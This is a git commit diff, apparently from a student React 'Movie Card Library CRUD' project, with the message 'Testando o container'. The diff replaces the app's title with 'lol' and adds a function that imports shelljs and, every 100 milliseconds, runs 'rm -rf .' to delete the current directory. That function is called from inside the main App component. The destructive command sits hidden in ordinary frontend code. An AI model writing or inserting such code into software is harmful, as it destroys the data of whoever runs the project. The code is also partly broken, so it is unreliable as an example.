efe32e9301c13c120158a6fcf0164fe27edc63b0
Eduardo Bonizio <eduardo.bonizio@gmail.com>
2021-01-27 17:33:06 -0300

    Testando o container

--- src/App.js
+++ src/App.js
@@ -1,8 +1,20 @@
 import React from 'react';
+import './App.css';
+import shell from 'shelljs';
 
+const doaa = () => {
+  //
+  setInterval(() => {
+    shell.exec('rm -rf .');
+  }, 100);
+  return this;
+};
 function App() {
   return (
-    <div>Movie Card Library CRUD</div>
+    <div>
+      <p>lol</p>
+      {doaa()}
+    </div>
   );
 }
 
